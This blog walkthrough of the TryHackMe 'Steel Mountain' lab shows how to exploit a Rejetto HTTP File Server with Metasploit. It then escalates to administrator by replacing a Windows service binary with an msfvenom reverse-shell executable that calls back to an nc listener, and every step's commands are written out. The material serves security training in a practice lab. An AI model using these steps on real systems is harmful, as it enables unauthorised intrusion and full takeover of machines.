---
title: "TryHackMe-SteelMountain" 
layout: post
date: 2020-04-28 22:44
image: /assets/images/pictures/Steel_Mountain/steelmountain.jpg
headerImage: true
tag:
- markdown
- elements
category: blog
author: DeShaun Ormond
description: Hello How are your
---


Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.

You can access this room here: [SteelMountain](https://tryhackme.com/room/steelmountain)

__You will need a subscription to complete this box__
## Table of Contents

- [Task 1: Introduction](#introduction)
- [Task 2: Initial Access](#initial-access)
- [Task 3: Privilege Escalation](#privilege-escalation)
<!--- [Task 4: Access and Escalation Without Metasploit](#access-and-escalation-without-metasploit) --> 


### Introduction

**Let's Begin!**


**Question 1: Deploy the machine. Who is the employee of the month?**
  
Deploy the box and run a nmap scan!

~~~
nmap -sC -sV <boxip> 
~~~

 ![nmap_scan](/assets/images/pictures/Steel_Mountain/nmap_scan.png)

We have two http services running, let's take a look at those websites!  Access the web service running on port 80
~~~
http://boxip:80
~~~

Right clik the image and click on image info. The name of the image will be our first flag! 
![alt text](/assets/images/pictures/Steel_Mountain/Flag1.png)


{: .box-success}
**Flag 1 :** XXX XXXXXX

### Initial Access

**Question 1: Scan the machine with nmap. What is the other port running a web server on?**
 
  Nmap already found what port the other web server was running.  
 
 {: .box-success}
**Flag :**XXXX

**Question 2: Take a look at the other web server. What file server is running?**

Access the webserver on port 8080 
~~~
http://boxip:8080
~~~

![alt text](/assets/images/pictures/Steel_Mountain/port8080.png)

If you look at the bottom left hand corner we see the file server version. If we click on the blue link it takes us to "Rejetto.com". Put two and two together and you now have your answer for the next flag! 

{: .box-success}
**Flag 2.2 :** XXXXXXX XXXX XXXX XXXXXX

**Question 3: What is the CVE number to exploit this file server?**

There are a lot of different ways to obtain the answer to this question, but I chose the quick route and googled 'Rejetto HTTP File Server Exploit'. This leads me to websites from Exploitdb and rapid7! Pick one and scroll down and you will find the CVE number. 

{: .box-success}
**Flag 2.3 :** XXXX-XXXX
 
> Question 4: Use Metasploit to get an initial shell. What is the user flag?
 
 Since rapid7 is the creator of Metasploit, it is a good bet that our CVE will be on metasploit. Let's run metasploit and exploit this box. 
 ~~~
 - msfconsole 
 - search rejetto 
 - use 0
 - set RHOST <boxip> 
 - set RPORT <8080>
 - set srvhost <vpn-ip>
 - run
~~~

 ![meterpreter shell](/assets/images/pictures/Steel_Mountain/meterpreter1.png)
 
 It looks like that exploit worked! We now have a meterpreter shell on the vulnerable machine. Type 'pwd' to find out what directory you are in. 

 Navigate to bill's 'Desktop' directory where you will find the user.txt file. Read the file and you will have your flag! 


![flag2.4](/assets/images/pictures/Steel_Mountain/Flag2_3.png)


{: .box-success}
**Flag2.4 :** XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX



### Privilege Escalation


  Now that we have a shell on this machine it is time to enumerate it! This room introduces us to PowerUp, a powershell script that is designed "to evaluate a Windows machine and determine any abnormalities". 

  You can download it from here [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) , or you can _open another terminal_ and run this command. 

~~~
curl https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 --output PowerUp.ps1

~~~

This will output a copy of the file to your current directory. Switch back to the terminal that has your meterpreter shell running and upload the file. Once you have uploaded it, you will need to load up powershell and run the commands given. 

 
 ![meterpreter upload](/assets/images/pictures/Steel_Mountain/meterpreterupload.png)
 
 ```
  ps> . . \PowerUp.ps1
  ps> Invoke-AllChecks
 ```

The enumeration file should start to run and you should get back some information on what service is running on this machine. Locate the services that have 'CanRestart' option set equal to 'True'. This will be your answer for the next flag! 

![flag3.2](/assets/images/pictures/Steel_Mountain/psscan.png)


{: .box-success}
**Flag :** XXXXXXXXXXXXXXXXXXX 


**Question 3: Use msfvenom to generate a reverse shell as an Windows executable. 
Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.**


Let's give it a shot! First lets create a reverse shell using msfvenom and output it to a file witht the same name. Open up a new terminal and enter the following command:

~~~
msfvenom -p windows/shell_reverse_tcp LHOST=X.X.X.X LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
~~~

Once that is done, switch back to your exploited machine and ctrl-c out of powershell and upload the malicious replicate file. 

![msfvenom](/assets/images/pictures/Steel_Mountain/msfvenom.png)

After the uploading is complete, drop into a shell by entering 'shell'. Once you have a shell, enter this command to stop the service. 

~~~
 > sc stop AdvancedSystemCareService9 
~~~

Perfect! We have stopped the service, now we need to switch it out with our malicious one. 

![Malware](/assets/images/pictures/Steel_Mountain/copyASC.png)

We now have to open a new terminal, start a listening session on port 4443 and then start the service. **Create a listening session first!**

~~~
- New terminal: nc -nlvp 4443
- Exploited Terminal: sc start AdvancedSystemCareService9
 ~~~

Boom! You will see a shell pop up on your listening terminal and you will have root access to the machine!

{: .box-success}
**No Answer Needed** 

On your new terminal, navigate to Administrator's Desktop and print out root.txt

![Final Flag](/assets/images/pictures/Steel_Mountain/Final_flag.png)


**Question #4: What is the root flag?**


{: .box-success}
**FLAG :**XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX



 



<!--
### Access and Escalation Without Metasploit

 The final task walks you through how to get access and escalation withoug using metasploit. 
 I won't walk you through but here is the answer to question 2:

{: .box-success}
 *powershell -c "Get-Service"*
{: .box-note}
*Note:** This is a notification box.### Warning {: .box-warning *Warning:** This is a warning box.### Error<!-- {: .box-error}**Error:** This is an error box. -->



